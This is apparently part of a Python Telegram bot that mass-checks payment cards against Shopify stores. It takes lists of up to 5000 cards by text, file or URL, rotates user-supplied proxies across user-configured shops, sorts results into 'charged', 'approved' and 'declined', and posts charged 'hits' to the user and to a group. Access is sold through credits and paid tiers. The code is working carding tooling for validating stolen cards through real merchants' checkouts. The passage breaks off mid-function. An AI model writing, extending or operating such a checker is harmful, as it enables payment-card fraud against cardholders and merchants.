<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝚊𝐭𝐞𝐰𝚊𝐲</b> ↬ <i><b>{gateway}</b></i>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐏𝐫𝐢𝐜𝐞 ↬ <b>{price} USD</b>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <b>{response_text}</b>
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫 ↬</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐇𝐢𝐭 𝐅𝐫𝐨𝐦</b> ↬ <a href='https://t.me/stripenigga'>𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>"""
    
    return hit_message

def msh_format_progress_response(stats: Dict, user_id: int, session_id: str) -> Tuple[str, InlineKeyboardMarkup]:
    """
    Format progress message with statistics.
    
    Args:
        stats: Dictionary containing statistics
        user_id: ID of the user
        session_id: Session ID for this mass check process
        
    Returns:
        Tuple of (formatted string, inline keyboard markup)
    """
    # Calculate percentage
    percentage = int((stats["checked"] / stats["total"]) * 100) if stats["total"] > 0 else 0
    
    # Create progress message with exact format requested (gateway added above total cards)
    progress_msg = f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙋𝙧𝙤𝙘𝙨𝙨𝞟𝙣𝙜 📊</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃 ↬ <code>{session_id}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐆𝚊𝐭𝐞𝐰𝚊𝐲 ↬ Shopify Rnd. Charge
<a href='https://t.me/rev3rsex'>⊀</a> 𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬 ↬ <code>{stats["total"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐂𝐡𝐞𝐜𝐤𝐝 ↬ <code>{stats["checked"]}/{stats["total"]} ({percentage}%)</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥 ↬ <code>{stats["charged"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ↬ <code>{stats["approved"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ↬ <code>{stats["declined"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐄𝐫𝐫𝐨𝐫 𝐂𝚊𝐫𝐝𝐬 ⚠️ ↬ <code>{stats["error"]}</code>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐒𝐭𝐨𝐩 𝐂𝐨𝐦𝐚𝐧𝐝 ↬ <code>/stop {session_id}</code>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    # No inline keyboard needed since we're using /stop command
    reply_markup = None
    
    return progress_msg, reply_markup

def msh_format_stopped_response(stats: Dict, elapsed_time: float, user_name: str, session_id: str) -> str:
    """
    Format stopped message with statistics (without stop button).
    
    Args:
        stats: Dictionary containing statistics
        elapsed_time: Time elapsed in seconds
        user_name: Name of the user
        session_id: Session ID for this mass check process
        
    Returns:
        Formatted string with stopped statistics
    """
    # Create stopped message with exact format requested (gateway added above total cards)
    stopped_msg = f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ⏹️</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃 ↬ <code>{session_id}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐆𝚊𝐭𝐞𝐰𝚊𝐲 ↬ Shopify Rnd. Charge
<a href='https://t.me/rev3rsex'>⊀</a> 𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬 ↬ <code>{stats["total"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐂𝐡𝐞𝐜𝐤𝐝 ↬ <code>{stats["checked"]}/{stats["total"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥 ↬ <code>{stats["charged"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ↬ <code>{stats["approved"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ↬ <code>{stats["declined"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐄𝐫𝐫𝐨𝐫 𝐂𝚊𝐫𝐝𝐬 ⚠️ ↬ <code>{stats["error"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐓𝐢𝐦𝐞 ↬ <code>{elapsed_time}s</code> ⏱️
<a href='https://t.me/rev3rsex'>⊀</a> 𝐂𝐡𝐞𝐜𝐤 𝐁𝐲 ↬ <code>{user_name}</code>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return stopped_msg

def msh_format_final_response(stats: Dict, elapsed_time: float, user_name: str, stopped: bool = False, session_id: str = None) -> str:
    """
    Format final results message with statistics.
    
    Args:
        stats: Dictionary containing statistics
        elapsed_time: Time elapsed in seconds
        user_name: Name of the user
        stopped: Whether the process was stopped by the user
        session_id: Session ID for this mass check process
        
    Returns:
        Formatted string with final statistics
    """
    # Create final message with exact format requested (gateway added above total cards)
    if stopped:
        status_text = "𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ⏹️"
        header_text = "𝑺𝒕𝒂𝒕𝒖𝒔"
    else:
        status_text = "𝙁𝙞𝙣𝙖𝙡 𝙎𝙩𝙖𝙩𝙪𝙨 ✅"
        header_text = "𝑺𝐮𝐦𝐦𝐚𝐫𝐲"
    
    final_msg = f"""<pre>⩙ {header_text} ↬ {status_text}</pre>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃 ↬ <code>{session_id if session_id else 'N/A'}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐆𝚊𝐭𝐞𝐰𝚊𝐲 ↬ Shopify Rnd. Charge
<a href='https://t.me/rev3rsex'>⊀</a> 𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬 ↬ <code>{stats["total"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐂𝐡𝐞𝐜𝐤𝐝 ↬ <code>{stats["checked"]}/{stats["total"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥 ↬ <code>{stats["charged"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ↬ <code>{stats["approved"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ↬ <code>{stats["declined"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐄𝐫𝐫𝐨𝐫 𝐂𝚊𝐫𝐝𝐬 ⚠️ ↬ <code>{stats["error"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> 𝐓𝐢𝐦𝐞 ↬ <code>{elapsed_time}s</code> ⏱️
<a href='https://t.me/rev3rsex'>⊀</a> 𝐂𝐡𝐞𝐜𝐤 𝐁𝐲 ↬ <code>{user_name}</code>
<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return final_msg

def msh_extract_urls_from_text(text: str) -> List[str]:
    """
    Extract all URLs from a text using regex.
    
    Args:
        text: Text to extract URLs from
        
    Returns:
        List of URLs found in the text
    """
    # Regex pattern to match URLs
    url_pattern = r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+[^\s]*'
    urls = re.findall(url_pattern, text)
    
    # Clean up URLs and remove trailing punctuation
    cleaned_urls = []
    for url in urls:
        # Remove trailing punctuation
        url = url.rstrip('.,;:!?)')
        # Ensure it's a valid URL
        if url.startswith(('http://', 'https://')):
            cleaned_urls.append(url)
    
    return cleaned_urls

# --- HELPER FUNCTIONS FOR FLOOD CONTROL ---

async def send_with_retry(bot, chat_id, text, retries=2, delay=2):
    """Send a message with retry logic to handle temporary floods."""
    for attempt in range(retries):
        try:
            return await bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as e:
            error_str = str(e).lower()
            if "flood" in error_str or "too many requests" in error_str:
                if attempt < retries - 1:
                    wait_time = delay * (attempt + 1)
                    logger.warning(f"Flood control detected for {chat_id}. Waiting {wait_time}s before retry {attempt+1}/{retries}")
                    await asyncio.sleep(wait_time)
                else:
                    logger.error(f"Failed to send to {chat_id} after {retries} retries due to flood.")
            else:
                # If not a flood error, raise immediately
                logger.error(f"Non-flood error sending to {chat_id}: {e}")
                raise
    return None

async def process_single_card(card: str, user_info: Dict, stats: Dict, 
                             context, update, user_id: int, stop_event: asyncio.Event, 
                             message_id: int, chat_id: int, proxy_index: int, session_id: str, include_approved: bool):
    """
    Process a single card with proper error handling and immediate stop functionality.
    OPTIMIZED: Added flood control for group messages and throttled progress updates.
    
    Args:
        card: Card details to check
        user_info: Dictionary containing user information
        stats: Dictionary containing statistics
        context: Telegram context object
        update: Telegram update object
        user_id: ID of the user
        stop_event: Event to signal when to stop checking
        message_id: ID of the progress message to update
        chat_id: ID of the chat to send messages to
        proxy_index: Index of proxy to use for this card
        session_id: Session ID for this mass check process
        include_approved: Whether to include approved cards in results
    """
    # Check if process has been stopped - IMMEDIATE CHECK
    if stop_event.is_set():
        return
    
    # Get user proxies from database directly
    user_proxies = get_user_proxies(user_info.get("id"))
    
    # Check if user has proxies
    if not user_proxies:
        logger.error(f"No proxy found for user {user_info.get('id')}")
        # Update stats for proxy error
        stats["checked"] += 1
        stats["error"] += 1
        
        # Send error message to user (Basic send, no retry needed for system errors)
        try:
            error_msg = f"⚠️ <i>Proxy Error</i> <code>{card}</code>: No proxy found. Please add a proxy using /proxy command."
            await context.bot.send_message(
                chat_id=user_info.get("id"),
                text=error_msg,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as e:
            logger.error(f"Error sending proxy error message to user {user_info.get('id')}: {str(e)}")
        return
    
    # Check card with stop event
    result = await check_single_card(card, user_info, user_proxies, proxy_index, max_retries=10, stop_event=stop_event, session_id=session_id)
    
    # Check if stopped after getting result
    if stop_event.is_set():
        return
    
    # Skip if result is None (stopped)
    if result is None:
        return
    
    # Format response
    formatted_response, status_category = format_mass_response(result, user_info)
    
    # Helper function to send message to user with fallback to active chat
    async def send_hit_to_user(text):
        """
        Tries to send DM to user. If that fails (e.g. privacy settings),
        sends the message to the active chat where the check is running.
        Includes retry logic for flood control.
        """
        dm_success = False
        # Try DM first
        try:
            await send_with_retry(
                context.bot,
                user_info.get("id"),
                text
            )
            dm_success = True
        except Exception as dm_err:
            logger.warning(f"Failed to send DM to user {user_info.get('id')}: {dm_err}. Attempting fallback to active chat.")
            
            # Fallback to active chat
            if chat_id:
                try:
                    await send_with_retry(
                        context.bot,
                        chat_id,
                        text
                    )
                    logger.info(f"Sent {status_category} result to active chat {chat_id} (Fallback)")
                except Exception as chat_err:
                    logger.error(f"Failed to send {status_category} result to active chat {chat_id}: {chat_err}")
        
        return dm_success

    # Send approved/charged cards to user's DM based on preference
    # Increased delay to 1.5s for better flood control
    should_send_hit = False
    if include_approved:
        if status_category in ["charged", "approved"]:
            should_send_hit = True
    else:
        if status_category == "charged":
            should_send_hit = True
    
    if should_send_hit:
        # Flood Control: Wait 1.5 seconds before sending hit message
        await asyncio.sleep(1.5)
        await send_hit_to_user(formatted_response)
    
    # Send to the hit detection group for charged cards (ORDER_PLACED)
    if status_category == "charged":
        # Acquire semaphore for group messages to prevent bot ban
        async with group_send_limiter:
            # Flood Control: Small delay before group actions
            await asyncio.sleep(1.0)

            # Send to hit detection group
            hit_message = msh_format_hit_detected_message(result, user_info)
            try:
                await send_with_retry(
                    context.bot,
                    HIT_DETECTION_GROUP_ID,
                    hit_message
                )
            except Exception as e:
                logger.error(f"Error sending hit detection message to group {HIT_DETECTION_GROUP_ID}: {str(e)}")
    
    # Update stats
    stats["checked"] += 1
    if status_category == "charged":
        stats["charged"] += 1
    elif status_category == "approved":
        if include_approved:
            stats["approved"] += 1
        # If include_approved is False, we simply don't count it in stats
    elif status_category == "declined":
        stats["declined"] += 1
    elif status_category == "proxy_error":
        stats["error"] += 1
    else:
        stats["error"] += 1
    
    # Safely get message details from active check dictionary
    process_data = active_mass_checks.get(session_id)
    if not process_data:
        logger.warning(f"Could not find process data for session {session_id} to update progress.")
        return

    # --- SMART PROGRESS UPDATE LOGIC ---
    # Update progress message ONLY if:
    # 1. At least 25 cards checked (reduced frequency)
    # 2. At least 8 seconds passed since last update (time throttling)
    
    should_update = False
    current_time = time.time()
    
    # Check card count interval
    if stats["checked"] % 25 == 0 or stats["checked"] == stats["total"]:
        # Check time interval
        last_update = process_data.get("last_progress_update", 0)
        if current_time - last_update > 8: # 8 second minimum gap
            should_update = True

    if should_update:
        process_data["last_progress_update"] = current_time # Update timestamp
        
        try:
            current_gateway = "Shopify Random $"
            
            progress_msg, reply_markup = msh_format_progress_response(stats, user_id, session_id)
            
            # Try to edit message (No retry needed for progress edits to avoid complexity)
            try:
                await context.bot.edit_message_text(
                    chat_id=process_data["chat_id"],
                    message_id=process_data["message_id"],
                    text=progress_msg,
                    parse_mode="HTML",
                    reply_markup=reply_markup,
                    disable_web_page_preview=True
                )
            except Exception as edit_error:
                # If error is just "not modified", ignore it
                if "Message is not modified" not in str(edit_error):
                    logger.warning(f"Failed to edit progress message: {str(edit_error)}")
            
            logger.info(f"Updated MSH progress for session {session_id}: {stats['checked']}/{stats['total']}")
        except Exception as e:
            logger.error(f"Error updating MSH progress message: {str(e)}")

async def msh_process_mass_check(cards: List[str], user_info: Dict, update, context, include_approved: bool):
    """
    Process mass check in parallel with controlled concurrency and instant stop functionality.
    
    Args:
        cards: List of cards to check
        user_info: Dictionary containing user information
        update: Telegram update object
        context: Telegram context object
        include_approved: Whether to include approved cards in results
    """
    user_id = user_info.get("id")
    first_name = user_info.get("first_name")
    
    # Generate a unique session ID
    session_id = msh_generate_session_id()
    
    logger.info(f"Starting MSH mass check for user {user_id} with session ID {session_id} and {len(cards)} cards")
    
    # Check if user has sites configured
    user_sites = get_user_sites(user_id)
    if not user_sites:
        await update.message.reply_text(
            "⚠️ <b>No sites configured!</b>\n\n"
            "<i>Please add your own sites using /seturl command before starting a mass check.</i>\n\n"
            "<b>Usage:</b> /seturl https://example.myshopify.com",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for user {user_id} - no sites configured")
        return
    
    # Initialize counters
    stats = {
        "total": len(cards),
        "checked": 0,
        "charged": 0,
        "approved": 0,
        "declined": 0,
        "error": 0
    }
    
    # Record start time
    start_time = time.time()
    
    # Create a stop event for this process
    stop_event = asyncio.Event()
    
    # Create a stop flag for this process
    active_mass_checks[session_id] = {
        "stopped": False,
        "stop_event": stop_event,
        "message_id": None,
        "start_time": start_time,
        "stats": stats,  # Store stats reference
        "workers": [],  # Store worker tasks for cancellation
        "user_id": user_id,  # Store user ID for permission checking
        "chat_id": None,  # Will be set later
        "session_id": session_id,  # Store session ID
        "last_progress_update": 0 # Initialize progress update timestamp
    }
    
    # Send initial progress message
    progress_msg, reply_markup = msh_format_progress_response(stats, user_id, session_id)
    progress_message = await update.message.reply_text(
        text=progress_msg,
        parse_mode="HTML",
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )
    
    # Store message ID and chat ID for editing later
    active_mass_checks[session_id]["message_id"] = progress_message.message_id
    active_mass_checks[session_id]["chat_id"] = progress_message.chat_id
    
    # Get user proxies for rotation
    user_proxies = get_user_proxies(user_id)
    
    # Create a separate semaphore for this mass check session (Limit concurrency to 15)
    semaphore = asyncio.Semaphore(40)
    
    async def check_card_with_semaphore(card, index):
        # Check if stopped before acquiring semaphore
        if stop_event.is_set():
            return None
        
        async with semaphore:
            # Check if stopped after acquiring semaphore
            if stop_event.is_set():
                return None
            
            # Create a task for processing this card with a specific proxy index
            task = asyncio.create_task(
                process_single_card(
                    card, 
                    user_info, 
                    stats, 
                    context, 
                    update, 
                    user_id,
                    stop_event,
                    active_mass_checks[session_id]["message_id"],
                    active_mass_checks[session_id]["chat_id"],
                    index % len(user_proxies) if user_proxies else 0,  # Use specific proxy for this card
                    session_id,  # Pass session ID
                    include_approved  # Pass approved card preference
                )
            )
            
            # Store task in active_mass_checks for cancellation
            active_mass_checks[session_id]["workers"].append(task)
            
            # Wait for task to complete
            try:
                await task
            except asyncio.CancelledError:
                logger.info(f"MSH task cancelled")
                return None
            
            return None
    
    # Create tasks for all cards with proper proxy rotation
    tasks = [asyncio.create_task(check_card_with_semaphore(card, i)) for i, card in enumerate(cards)]
    
    # Process results as they complete
    for task in asyncio.as_completed(tasks):
        # Check if stopped
        if stop_event.is_set():
            logger.info(f"MSH session {session_id} stopped by user - cancelling remaining tasks")
            # Cancel all remaining tasks
            for remaining_task in tasks:
                if not remaining_task.done():
                    remaining_task.cancel()
                    logger.info(f"Cancelled MSH task")
            break
        
        # Get result
        try:
            await task
        except asyncio.CancelledError:
            logger.info(f"MSH task cancelled")
            continue
    
    # Calculate elapsed time
    elapsed_time = round(time.time() - start_time, 2)
    logger.info(f"MSH mass check completed for user {user_id} with session ID {session_id} in {elapsed_time}s")
    
    # Get user credits to check if unlimited
    user_credits = get_user_credits(user_id)
    is_unlimited = user_credits == float('inf')
    
    # Check if process was stopped by user
    stopped = stop_event.is_set()
    
    # Deduct only 1 credit for a successful mass check (only if not stopped)
    if not is_unlimited and not stopped:
        update_user_credits(user_id, -1)
        logger.info(f"Deducted 1 credit from MSH user {user_id}")
    
    # Safely get final process data before cleanup
    process_data = active_mass_checks.get(session_id)
    if process_data:
        chat_id = process_data.get("chat_id")
        message_id = process_data.get("message_id")
    else:
        logger.error(f"Could not retrieve final message details for session {session_id} after completion.")
        chat_id, message_id = None, None

    # Send final stats message with requested format
    if chat_id and message_id:
        try:
            # Try to edit message
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=msh_format_final_response(stats, elapsed_time, first_name, stopped, session_id),
                    parse_mode="HTML",
                    disable_web_page_preview=True
                )
            except Exception as edit_error:
                # If editing fails, try to send a new message
                logger.warning(f"Failed to edit final message: {str(edit_error)}")
                try:
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=msh_format_final_response(stats, elapsed_time, first_name, stopped, session_id),
                        parse_mode="HTML",
                        disable_web_page_preview=True
                    )
                except Exception as send_error:
                    logger.error(f"Failed to send new final message: {str(send_error)}")
        except Exception as e:
            logger.error(f"Error sending MSH final message: {str(e)}")
    
    # Clean up process entry immediately after stopping
    if session_id in active_mass_checks:
        del active_mass_checks[session_id]
    
    logger.info(f"MSH mass check process cleaned up for user {user_id} with session ID {session_id}")

async def handle_stop_command(update: Update, context: CallbackContext):
    """
    Handle the /stop command to stop a specific mass check session.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    
    # Extract session ID from command arguments
    if not context.args:
        # List all active sessions for this user
        user_sessions = [session_id for session_id, data in active_mass_checks.items() if data["user_id"] == user_id]
        
        if not user_sessions:
            await update.message.reply_text(
                "⚠️ <b>No active mass check sessions found.</b>\n\n"
                "<i>Start a mass check with /msh command first.</i>",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
        
        session_list = "\n".join([f"• <code>{session_id}</code>" for session_id in user_sessions])
        await update.message.reply_text(
            f"📋 <b>Your active mass check sessions:</b>\n\n"
            f"{session_list}\n\n"
            f"<i>Use /stop &lt;session_id&gt; to stop a specific session.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    session_id = context.args[0].upper()
    
    # Check if there's an active mass check for this session ID
    if session_id not in active_mass_checks:
        await update.message.reply_text(
            f"⚠️ <b>No active mass check session found with ID:</b> <code>{session_id}</code>\n\n"
            "<i>Check the session ID and try again.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Check if user who sent the command is the same as the one who initiated the check
    if active_mass_checks[session_id]["user_id"] != user_id:
        await update.message.reply_text(
            "⛔ <b>Access denied!</b>\n\n"
            "<i>You can only stop your own mass check sessions.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Set stop flag and event for this session - IMMEDIATE STOP
    active_mass_checks[session_id]["stopped"] = True
    stop_event = active_mass_checks[session_id].get("stop_event")
    if stop_event:
        stop_event.set()
    
    logger.info(f"MSH stop requested by user {user_id} for session {session_id}")
    
    # Cancel all running tasks for this session with immediate effect
    if "workers" in active_mass_checks[session_id]:
        for task in active_mass_checks[session_id]["workers"]:
            if not task.done():
                task.cancel()
                logger.info(f"Cancelled MSH task for session {session_id}")
    
    # Calculate elapsed time
    start_time = active_mass_checks[session_id].get("start_time", time.time())
    elapsed_time = round(abs(time.time() - start_time), 2)
    
    # Get stats from active_mass_checks
    stats = active_mass_checks[session_id].get("stats", {
        "total": 0,
        "checked": 0,
        "charged": 0,
        "approved": 0,
        "declined": 0,
        "error": 0
    })
    
    # Get chat_id and message_id
    chat_id = active_mass_checks[session_id].get("chat_id")
    message_id = active_mass_checks[session_id].get("message_id")
    
    # Update progress message to show "Stopped" without stop button
    if chat_id and message_id:
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=msh_format_stopped_response(stats, elapsed_time, first_name, session_id),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as e:
            # If we get a "Message is not modified" error, try to send a new message
            if "Message is not modified" in str(e):
                try:
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=msh_format_stopped_response(stats, elapsed_time, first_name, session_id),
                        parse_mode="HTML",
                        disable_web_page_preview=True
                    )
                except Exception as e2:
                    logger.error(f"Error sending MSH stop message: {str(e2)}")
            else:
                logger.error(f"Error updating MSH stop message: {str(e)}")
    
    # Send confirmation message to user
    await update.message.reply_text(
        f"✅ <b>Mass check session stopped successfully!</b>\n\n"
        f"<b>Session ID:</b> <code>{session_id}</code>\n"
        f"<b>Cards checked:</b> <code>{stats['checked']}/{stats['total']}</code>\n"
        f"<b>Time elapsed:</b> <code>{elapsed_time}s</code>",
        parse_mode="HTML",
        disable_web_page_preview=True
    )
    
    # NOTE: DO NOT DELETE from active_mass_checks HERE.
    # The main process_mass_check function will handle cleanup after its tasks are fully cancelled.
    # This prevents the KeyError race condition.

async def handle_msh_command(update, context):
    """
    Handle the /msh command for mass checking Shopify cards.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    logger.info(f"Mass check command received from user {user_id} ({first_name})")
    
    # Check if user has an active plan (not Trial)
    user_tier = get_user_current_tier(user_id)
    
    if user_tier == "Trial":
        await update.message.reply_text(
            "⚠️ <b>This command is only available for users with an active plan.</b>\n\n"
            "<i>Upgrade your plan to use mass checking features.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for trial user {user_id}")
        return
    
    # CHECK FOR CONCURRENT MASS CHECKS
    # Prevent user from running a new mass check if one is already active
    for session_id, data in active_mass_checks.items():
        if data["user_id"] == user_id:
            await update.message.reply_text(
                "⚠️ <b>You already have an active mass check running!</b>\n\n"
                "<i>Please use /stop to stop the current process before starting a new one.</i>",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            logger.info(f"Mass check denied for user {user_id} - process already running")
            return

    # Check if user has proxies in database
    user_proxies = get_user_proxies(user_id)
    
    if not user_proxies:
        await update.message.reply_text(
            "⚠️ <b>No proxies found!</b>\n\n"
            "<i>Please add at least one proxy using /proxy command.</i>\n\n"
            "<b>Proxy format:</b> http://username:password@host:port",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for user {user_id} - no proxies found")
        return
    
    # Check if user has sites configured
    user_sites = get_user_sites(user_id)
    if not user_sites:
        await update.message.reply_text(
            "⚠️ <b>No sites configured!</b>\n\n"
            "<i>Please add your own sites using /seturl command before starting a mass check.</i>\n\n"
            "<b>Usage:</b> /seturl https://example.myshopify.com",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for user {user_id} - no sites configured")
        return
    
    # Initialize cards list
    cards = []
    
    # Check if a document was provided
    if update.message.document and update.message.document.mime_type == "text/plain":
        # Download the file
        file = await context.bot.get_file(update.message.document.file_id)
        file_content = await file.download_as_bytearray()
        text = file_content.decode('utf-8')
        
        # Split by new lines and filter out empty lines
        cards = [line.strip() for line in text.split('\n') if line.strip()]
        logger.info(f"Loaded {len(cards)} cards from file for user {user_id}")
    # Check if cards were provided as text (after command)
    elif context.args:
        # Get the message text directly to preserve newlines
        message_text = update.message.text
        
        # Remove command and any leading/trailing whitespace
        if message_text.startswith('/msh'):
            message_text = message_text[4:].strip()
        
        # Parse cards from the message
        for line in message_text.split('\n'):
            # Check if it's a URL to a file
            if line.startswith('http'):
                try:
                    # Fetch the file content
                    async with aiohttp.ClientSession() as session:
                        async with session.get(line) as response:
                            if response.status == 200:
                                content = await response.text()
                                # Split by newlines and add to cards list
                                file_cards = [card.strip() for card in content.split('\n') if card.strip()]
                                cards.extend(file_cards)
                                logger.info(f"Loaded {len(file_cards)} cards from URL: {line}")
                            else:
                                logger.warning(f"Failed to fetch cards from URL: {line}, status: {response.status}")
                except Exception as e:
                    logger.error(f"Error fetching cards from URL {line}: {str(e)}")
            else:
                # Treat as a single card line
                cards.append(line.strip())
        
        # Filter out empty lines
        cards = [card for card in cards if card]
        logger.info(f"Loaded {len(cards)} cards from message for user {user_id}")
    # Check if there's a reply to a message with cards
    elif update.message.reply_to_message:
        # Check if the replied message has text
        if update.message.reply_to_message.text:
            # Get the text from the replied message
            reply_text = update.message.reply_to_message.text
            
            # Parse cards from the reply
            for line in reply_text.split('\n'):
                # Check if it's a URL to a file
                if line.startswith('http'):
                    try:
                        # Fetch the file content
                        async with aiohttp.ClientSession() as session:
                            async with session.get(line) as response:
                                if response.status == 200:
                                    content = await response.text()
                                    # Split by newlines and add to cards list
                                    file_cards = [card.strip() for card in content.split('\n') if card.strip()]
                                    cards.extend(file_cards)
                                    logger.info(f"Loaded {len(file_cards)} cards from URL: {line}")
                                else:
                                    logger.warning(f"Failed to fetch cards from URL: {line}, status: {response.status}")
                    except Exception as e:
                        logger.error(f"Error fetching cards from URL {line}: {str(e)}")
                else:
                    # Treat as a single card line
                    cards.append(line.strip())
            
            # Filter out empty lines
            cards = [card for card in cards if card]
            logger.info(f"Loaded {len(cards)} cards from reply for user {user_id}")
        # Check if the replied message has a document
        elif update.message.reply_to_message.document and update.message.reply_to_message.document.mime_type == "text/plain":
            # Download the file
            file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
            file_content = await file.download_as_bytearray()
            text = file_content.decode('utf-8')
            
            # Split by new lines and filter out empty lines
            cards = [line.strip() for line in text.split('\n') if line.strip()]
            logger.info(f"Loaded {len(cards)} cards from replied file for user {user_id}")
    
    # Validate that we have cards
    if not cards:
        await update.message.reply_text(
            "⚠️ <b>No cards provided!</b>\n\n"
            "<i>Usage: /msh followed by cards in separate lines, upload a .txt file with cards, reply to a message containing cards, or provide a URL to a text file with cards</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for user {user_id} - no cards provided")
        return
    
    # Get user credits
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    if not has_credits:
        await update.message.reply_text(
            "⚠️ <b>You don't have enough credits to use this command.</b>\n\n"
            "<i>Please recharge to continue using this service.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for user {user_id} - insufficient credits")
        return
    
    # Check if number of cards exceeds limit
    if len(cards) > 5000:
        await update.message.reply_text(
            f"⚠️ <b>Too many cards provided!</b>\n\n"
            f"<i>Maximum allowed is 5000 cards, but you provided {len(cards)}.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for user {user_id} - too many cards: {len(cards)}")
        return
    
    # Check if user has enough credits for all cards (only need 1 credit for successful mass check)
    if not is_unlimited and user_credits < 1:
        await update.message.reply_text(
            f"⚠️ <b>Not enough credits!</b>\n\n"
            f"<i>You need at least 1 credit to use mass checking.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for user {user_id} - insufficient credits")
        return
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # NEW: Store data and ask for confirmation instead of starting immediately
    pending_mass_checks[user_id] = {
        "cards": cards,
        "user_info": user_info,
        "update": update
    }

    # Create confirmation keyboard
    keyboard = [
        [
            InlineKeyboardButton("Yes", callback_data=f"msh_yes_{user_id}"),
            InlineKeyboardButton("No", callback_data=f"msh_no_{user_id}")
